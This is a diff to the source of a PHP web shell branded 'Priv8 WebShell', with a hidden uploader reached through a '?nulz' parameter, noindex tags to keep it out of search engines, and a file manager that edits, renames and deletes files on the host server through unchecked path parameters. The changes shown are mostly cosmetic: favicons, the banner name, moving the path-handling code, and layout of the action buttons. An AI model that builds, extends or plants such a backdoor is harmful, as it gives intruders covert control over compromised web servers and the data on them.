@@ -157,6 +157,8 @@ if (empty($_SESSION['login'])) {
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
+    <link href="<?= $shellicon ?>" rel="shortcut icon" type="image/x-icon">
+    <link rel="apple-touch-icon" href="<?= $shellicon ?>"/>
     <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
     <style>
     @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");
@@ -455,7 +457,7 @@ if (empty($_SESSION['login'])) {
     /*NuLz Ganteng*/
     typewriter
         .pauseFor(500)
-        .typeString("Welcome To Priv8 WebShell")
+        .typeString("Welcome To <?=$shellName?>")
         .pauseFor(2000)
         .deleteChars(25)
         .typeString("Created By NuLz & Omest")
@@ -498,7 +500,8 @@ if (isset($_GET['nulz'])) {
                 <meta http-equiv="X-UA-Compatible" content="ie=edge">
                 <meta name="description" content="This Is A Hidden Uploader">
                 <meta name="author" content="NuLz404">
-                <link rel="shortcut icon" href="'.$shellIcon.'" type="image/x-icon" />
+                <link href="'.$shellicon.'" rel="shortcut icon" type="image/x-icon">
+                <link rel="apple-touch-icon" href="'.$shellicon.'"/>
                 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                 <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
@@ -694,6 +697,14 @@ if (isset($_GET['nulz'])) {
         </html>';
     }
 }
+// PATH
+if (isset($_GET['path'])) {
+    $path = $_GET['path'];
+    chdir($_GET['path']);
+} else {
+    $path = getcwd();
+}
+$path = str_replace("\\", "/", $path);
 ?>
 <!doctype html>
 <html>
@@ -708,8 +719,8 @@ if (isset($_GET['nulz'])) {
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
     <meta name="description" content=".:<?= $shellName ?>:." />
-    <link href="<?=$shellicon?>" rel="shortcut icon" type="image/x-icon">
-    <link rel="apple-touch-icon" href="<?=$shellicon?>"/>
+    <link href="<?= $shellicon ?>" rel="shortcut icon" type="image/x-icon">
+    <link rel="apple-touch-icon" href="<?= $shellicon ?>"/>
     <!-- Font Api -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -1025,7 +1036,7 @@ if (isset($_GET['nulz'])) {
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$shellLogo?>" alt="LOGO"><h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $shellName ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$shellLogo?>" alt="LOGO"><h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $shellName ?></h1></a>
             <span class="fs-xl poppins <?= $txtPurple ?>">Kernel: <font class="ubuntu-mono <?= $txtGreen ?>">
                     <?= $kernel ?>
                 </font></span>
@@ -1066,13 +1077,7 @@ if (isset($_GET['nulz'])) {
                     </script>
             <span class="fs-xl poppins <?= $txtPurple ?>">DISABLE FUNCTIONS: <?= $cekFunc ?></span>
             <?php
-            if (isset($_GET['path'])) {
-                $path = $_GET['path'];
-                chdir($_GET['path']);
-            } else {
-                $path = getcwd();
-            }
-            $path = str_replace("\\", "/", $path);
+
             $paths = explode("/", $path);
             echo '<span class="fs-xl poppins ' . $txtPurple . '">PWD: ';
             foreach ($paths as $id => $pat) {
@@ -1389,10 +1394,10 @@ if (isset($_GET['nulz'])) {
                         echo "</td></center>";
                         echo "<td><center>";
                         ?>
-                    <form class="whitespace-nowrap" action="?option&path=<?= $path ?>" method="POST">
-                    <a href="?option&path=<?= $path ?>/&rename=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
-                    <a href="?option&path=<?= $path ?>/&deletedir=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
-                    </form>
+                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
+                    <a href="?option&path=<?= $path ?>/&rename=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
+                    <a href="?option&path=<?= $path ?>/&deletedir=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
+                    </div>
                     <?php
                         echo "</center></td>";
                     } 
@@ -1423,9 +1428,11 @@ if (isset($_GET['nulz'])) {
                             echo "</center></td>";
                         echo "<td><center>";
                         ?>
-                    <a href="?option&path=<?= $path ?>/&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-solid fa-file-pen"></i></button></a>
-                    <a href="?option&path=<?= $path ?>/&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
-                    <a href="?option&path=<?= $path ?>/&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
+                    <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
+                    <a href="?option&path=<?= $path ?>/&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-solid fa-file-pen"></i></button></a>
+                    <a href="?option&path=<?= $path ?>/&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
+                    <a href="?option&path=<?= $path ?>/&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
+                    </div>
                     <?php echo "</center></td>"; } ?>
                 </tbody>
             </table>
